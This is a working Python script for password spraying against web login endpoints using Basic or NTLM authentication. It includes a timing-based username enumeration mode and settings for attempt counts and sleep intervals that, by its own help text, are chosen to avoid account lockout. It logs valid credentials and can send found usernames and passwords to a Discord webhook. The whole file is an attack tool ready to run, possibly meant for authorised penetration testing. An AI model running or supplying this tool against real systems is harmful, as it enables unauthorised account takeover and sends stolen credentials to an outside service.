#!/usr/bin/env python3

import requests
import requests_random_user_agent
from requests_ntlm import HttpNtlmAuth
import json
from base64 import b64encode as be, b64decode as bd
import argparse
from time import sleep, time
from datetime import datetime
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from multiprocessing import Pool

def send_discord_notification(webhook_url, message, color=0x00ff00):
    """Send a notification to Discord using webhook"""
    if not webhook_url:
        return
    
    embed = {
        "title": "Password Spray Update",
        "description": message,
        "color": color,
        "timestamp": datetime.utcnow().isoformat()
    }
    
    data = {
        "embeds": [embed]
    }
    
    try:
        requests.post(webhook_url, json=data)
    except Exception as e:
        print(f"Failed to send Discord notification: {e}")

def get_baseline_timing(url, domain, authtype, proxies):
    """Get baseline timings for valid (guest) and invalid (random) usernames"""
    print("Establishing baseline timings...")
    
    test_password = "Password123!"
    
    # Test with 'guest' account (likely valid username)
    guest_times = []
    for i in range(5):
        opts = (url, domain, "guest", test_password, authtype, proxies, True, False, None)
        elapsed = check_creds_timing_only(opts)
        if elapsed:
            guest_times.append(elapsed)
        sleep(0.5)
    
    # Test with random invalid username
    invalid_times = []
    for i in range(5):
        opts = (url, domain, "asdfasdfadf", test_password, authtype, proxies, True, False, None)
        elapsed = check_creds_timing_only(opts)
        if elapsed:
            invalid_times.append(elapsed)
        sleep(0.5)
    
    if not guest_times or not invalid_times:
        print("[ERROR] Failed to establish baseline timings")
        return None, None
    
    avg_guest = sum(guest_times) / len(guest_times)
    avg_invalid = sum(invalid_times) / len(invalid_times)
    
    print(f"Baseline - Valid username (guest): {avg_guest:.2f}ms")
    print(f"Baseline - Invalid username: {avg_invalid:.2f}ms")
    
    # Check if baselines are too close (within 100ms)
    diff = abs(avg_guest - avg_invalid)
    if diff < 100:
        print(f"\n[ERROR] Baseline timings are too close ({diff:.2f}ms difference)")
        print("[ERROR] The domain provided is probably wrong or timing attack won't work on this endpoint")
        print("[ERROR] Valid and invalid usernames should have significantly different response times")
        return None, None
    
    print(f"Timing difference: {diff:.2f}ms")
    print(f"Threshold: {avg_guest + 500:.2f}ms")
    
    return avg_guest, avg_invalid

def check_creds_timing_only(opts):
    """Check credentials and return only timing (for baseline establishment)"""
    url, domain, username, password, authtype, proxies, track_time, verbose, webhook_url = opts

    headers = {}
    if authtype == "ntlm":
        if domain:
            auth = HttpNtlmAuth(f"{domain}\\{username}", password)
        else:
            auth = HttpNtlmAuth(username, password)
        headers = {"X-Force-NTLM": "true"}
    else:
        if domain:
            auth = (f"{domain}\\{username}", password)
        else:
            auth = (username, password)

    try:
        timeA = time()
        res = requests.get(
            url,
            verify=False,
            proxies=proxies,
            auth=auth,
            headers=headers,
            allow_redirects=False,
        )
        timeB = time()
        elapsedTimeMs = round((timeB - timeA) * 1000, 2)
        return elapsedTimeMs
    except Exception as e:
        print(f"[ERROR] {username}: {e}")
        return None

def check_username_enum(opts):
    """Check if username is valid based on timing attack"""
    url, domain, username, password, authtype, proxies, baseline_valid, baseline_invalid, threshold, verbose, webhook_url = opts

    headers = {}
    if authtype == "ntlm":
        if domain:
            auth = HttpNtlmAuth(f"{domain}\\{username}", password)
        else:
            auth = HttpNtlmAuth(username, password)
        headers = {"X-Force-NTLM": "true"}
    else:
        if domain:
            auth = (f"{domain}\\{username}", password)
        else:
            auth = (username, password)

    try:
        timeA = time()
        res = requests.get(
            url,
            verify=False,
            proxies=proxies,
            auth=auth,
            headers=headers,
            allow_redirects=False,
        )
        timeB = time()
        elapsedTimeMs = round((timeB - timeA) * 1000, 2)

        # Determine if username is valid based on timing
        # Valid usernames should be closer to baseline_valid timing
        diff_from_valid = abs(elapsedTimeMs - baseline_valid)
        diff_from_invalid = abs(elapsedTimeMs - baseline_invalid)
        
        # If response time is within threshold of valid baseline, consider it valid
        if elapsedTimeMs <= (baseline_valid + threshold):
            status = "[VALID USERNAME]"
            output = f"{status} {username} - {elapsedTimeMs}ms (baseline: {baseline_valid:.2f}ms, diff: {diff_from_valid:.2f}ms)"
            print(output)
            
            if webhook_url:
                send_discord_notification(
                    webhook_url,
                    f"Valid username found!\nUsername: {username}\nTiming: {elapsedTimeMs}ms",
                    color=0x00ff00
                )
            
            return username
        else:
            status = "[INVALID USERNAME]"
            output = f"{status} {username} - {elapsedTimeMs}ms (baseline: {baseline_invalid:.2f}ms, diff: {diff_from_invalid:.2f}ms)"
            if verbose:
                print(output)

    except Exception as e:
        status = "[ERROR]"
        output = f"{status} {username}: {e}"
        print(output)
    
    return None

def check_creds(opts):
    url, domain, username, password, authtype, proxies, track_time, verbose, webhook_url = opts

    headers = {}
    if authtype == "ntlm":
        if domain:
            auth = HttpNtlmAuth(f"{domain}\\{username}", password)
        else:
            auth = HttpNtlmAuth(username, password)
        headers = {"X-Force-NTLM": "true"}
    else:
        if domain:
            auth = (f"{domain}\\{username}", password)
        else:
            auth = (username, password)

    try:
        timeA = time()
        res = requests.get(
            url,
            verify=False,
            proxies=proxies,
            auth=auth,
            headers=headers,
            allow_redirects=False,
        )
        timeB = time()
        elapsedTimeMs = round((timeB - timeA) * 1000, 2)

        if res.status_code != 401 and res.status_code != 403:
            status = "[VALID]"
            if track_time:
                output = f"{status} {username}:{password}  - {elapsedTimeMs}ms"
            else:
                output = f"{status} {username}:{password}"
            
            print(f"{output}")
            
            # Send Discord notification for valid credentials
            if webhook_url:
                send_discord_notification(
                    webhook_url,
                    f"Valid credentials found!\nUsername: {username}\nPassword: {password}",
                    color=0x00ff00
                )
            
            return username, password
        
        else:
            status = "[FAILED]"
            if track_time:
                output = f"{status} {username}:{password}  - {elapsedTimeMs}ms"
                print(output)
            else:
                output = f"{status} {username}:{password}"
                if verbose:
                    print(output)

    except Exception as e:
        status = "[ERROR]"
        output = f"{status} {username}:{password}: {e}"
        print(output)

if __name__ == "__main__":
    args = argparse.ArgumentParser()

    args.add_argument(
        "-u", "--usernames", help="List of usernames to attack"
    )
    args.add_argument(
        "-p", "--passwords", help="List of passwords to try"
    )
    args.add_argument(
        "-c", "--userpass", help="File containing user/password combinations"
    )
    args.add_argument(
        "-d",
        "--domain",
        help="Domain name to append. If not included, then domains will be assumed to be in username list.",
        required=False,
    )
    args.add_argument("-U", "--url", help="URL to authenticate against", required=True)
    args.add_argument(
        "-a",
        "--attempts",
        help="Number of attempts to try before sleeping. If your lockout policy is 5 attempts per 10 minutes, then set this to like 3",
        type=int,
        default=1,
    )
    args.add_argument(
        "-i",
        "--interval",
        help="Number of minutes to sleep between attacks. If your lockout policy is per 10 minutes, set this to like 11",
        type=int,
        default=120,
    )
    args.add_argument(
        "--authtype",
        help="Authentication type - basic or ntlm. Note: You can't use a proxy with NTLM",
        choices=["ntlm", "basic"],
        default="basic",
    )
    args.add_argument("--proxy", help="Proxy server to route traffic through")
    args.add_argument("--threads", help="Number of threads", type=int, default=1)
    args.add_argument(
        "--output", help="File to write successful pairs to", default="success.log"
    )
    args.add_argument(
        "--add_response", help="Add response times to output", action="store_true"
    )
    args.add_argument(
        "-v", "--verbose", help="Enable verbose output", action="store_true"
    )
    args.add_argument(
        "--webhook", help="Discord webhook URL for notifications"
    )
    args.add_argument(
        "--enum", help="Username enumeration mode (timing attack)", action="store_true"
    )
    args.add_argument(
        "--enum-threshold", help="Timing threshold in ms for username enumeration (default: 500)", 
        type=int, default=500
    )
    opts = args.parse_args()

    if opts.proxy and opts.authtype == "basic":
        proxies = {"http": opts.proxy, "https": opts.proxy}
    else:
        proxies = {}

    # Username enumeration mode
    if opts.enum:
        if not opts.usernames:
            print("[ERROR] Username enumeration mode requires -u/--usernames")
            exit(1)
        
        print("=" * 60)
        print("USERNAME ENUMERATION MODE")
        print("=" * 60)
        
        # Send initial Discord notification
        if opts.webhook:
            send_discord_notification(
                opts.webhook,
                f"Starting username enumeration\nURL: {opts.url}",
                color=0x0000ff
            )
        
        # Get baseline timings
        baseline_valid, baseline_invalid = get_baseline_timing(
            opts.url, opts.domain, opts.authtype, proxies
        )
        
        if baseline_valid is None:
            exit(1)
        
        print(f"\n[{str(datetime.now())}] Starting username enumeration")
        usernames = [u for u in open(opts.usernames).read().split("\n") if u]
        
        # Read existing valid usernames to deduplicate
        output_file = "valid-usernames.txt"
        existing_usernames = set()
        try:
            with open(output_file, "r") as f:
                existing_usernames = set(line.strip() for line in f if line.strip())
        except FileNotFoundError:
            pass
        
        test_password = "Password123!"
        attempts = [
            (opts.url, opts.domain, u, test_password, opts.authtype, proxies,
             baseline_valid, baseline_invalid, opts.enum_threshold, opts.verbose, opts.webhook)
            for u in usernames
        ]
        
        valid_usernames = set()
        with Pool(opts.threads) as p:
            for result in p.imap_unordered(check_username_enum, attempts):
                if result:
                    valid_usernames.add(result)
        
        # Combine with existing and deduplicate
        all_valid_usernames = existing_usernames.union(valid_usernames)
        
        # Write deduplicated usernames to file
        with open(output_file, "w") as f:
            for username in sorted(all_valid_usernames):
                f.write(f"{username}\n")
        
        new_count = len(valid_usernames)
        total_count = len(all_valid_usernames)
        
        print(f"\n{'=' * 60}")
        print(f"[{str(datetime.now())}] Username enumeration complete!")
        print(f"New valid usernames found: {new_count}")
        print(f"Total unique valid usernames: {total_count}")
        print(f"Results written to: {output_file}")
        print(f"{'=' * 60}")
        
        if opts.webhook:
            send_discord_notification(
                opts.webhook,
                f"Username enumeration completed!\nNew valid usernames: {new_count}\nTotal unique: {total_count}",
                color=0x00ff00
            )
        
        exit(0)

    # Send initial Discord notification
    if opts.webhook:
        send_discord_notification(
            opts.webhook,
            f"Starting new password spray run\nURL: {opts.url}\nAttempts: {opts.attempts}\nInterval: {opts.interval} minutes",
            color=0x0000ff
        )

    if opts.userpass:
        print("Running in user/pass mode")

        data = open(opts.userpass).read().split('\n')

        users = {}

        for d in data:
            if d:
                user, pw = d.split(':', 1)

                if user not in users:
                    users[user] = []
                if pw not in users[user]:
                    users[user].append(pw)

        mx = 0
        for u, p in users.items():
            if len(p) > mx:
                mx = len(p)

        attack_sets = []
        for i in range(mx):
            attack_sets.append([])

        for u, pw in users.items():
            for i, p in enumerate(pw):
                attack_sets[i].append(
                    (
                        opts.url, opts.domain, u, p, opts.authtype, proxies, 
                        opts.add_response, opts.verbose, opts.webhook
                    )
                )
        print(f"{mx} Attack Sets Created from User Pass file")
        i = 0
        current = 1
        total = mx
        f = open(opts.output, "a")
        f.write(f"New run: {str(datetime.now())}\n")
        print("=" * 60)
        print("PASSWORD SPRAYING MODE")
        print("=" * 60)
        print(f"\nSpraying {opts.attempts} passwords, then sleeping for {opts.interval}.")
        print(f"URL: {opts.url}")

        for attempts in attack_sets:
            i += 1

            print(f"[{str(datetime.now())}] Attempting set ({current}/{total})")
            
            # Send Discord notification for new spray set
            if opts.webhook:
                send_discord_notification(
                    opts.webhook,
                    f"Starting new spray set ({current}/{total})",
                    color=0x0000ff
                )
            
            with Pool(opts.threads) as p:
                for s in p.imap_unordered(check_creds, attempts):
                    if s:
                        f.write(f"{s[0]}:{s[1]}" + "\n")
                        f.flush()

            if i == opts.attempts and current < total:
                print(f"[{str(datetime.now())}] Sleeping for {opts.interval} minutes.")
                sleep(opts.interval * 60)
                i = 0

            current += 1
    else:
        usernames = [u for u in open(opts.usernames).read().split("\n") if u]
        passwords = [p for p in open(opts.passwords).read().split("\n") if p]

        i = 0
        current = 1
        total = len(passwords)
        f = open(opts.output, "a")
        f.write(f"New run: {str(datetime.now())}\n")
        print("=" * 60)
        print("PASSWORD SPRAYING MODE")
        print("=" * 60)
        print(f"\nSpraying {opts.attempts} passwords, then sleeping for {opts.interval}.")
        print(f"URL: {opts.url}")
        
        for p in passwords:
            i += 1

            print(f"[{str(datetime.now())}] Attempting {p} ({current}/{total})")
            
            # Send Discord notification for new password attempt
            if opts.webhook:
                send_discord_notification(
                    opts.webhook,
                    f"Attempting password: {p} ({current}/{total})",
                    color=0x0000ff
                )
            
            attempts = [
                (opts.url, opts.domain, u, p, opts.authtype, proxies, 
                 opts.add_response, opts.verbose, opts.webhook)
                for u in usernames
            ]
            with Pool(opts.threads) as p:
                for s in p.imap_unordered(check_creds, attempts):
                    if s:
                        f.write(f"{s[0]}:{s[1]}" + "\n")
                        f.flush()

            if i == opts.attempts and current < total:
                print(f"[{str(datetime.now())}] Sleeping for {opts.interval} minutes.")
                sleep(opts.interval * 60)
                i = 0

            current += 1

    # Send final Discord notification
    if opts.webhook:
        send_discord_notification(
            opts.webhook,
            "Password spray run completed!",
            color=0x00ff00
        )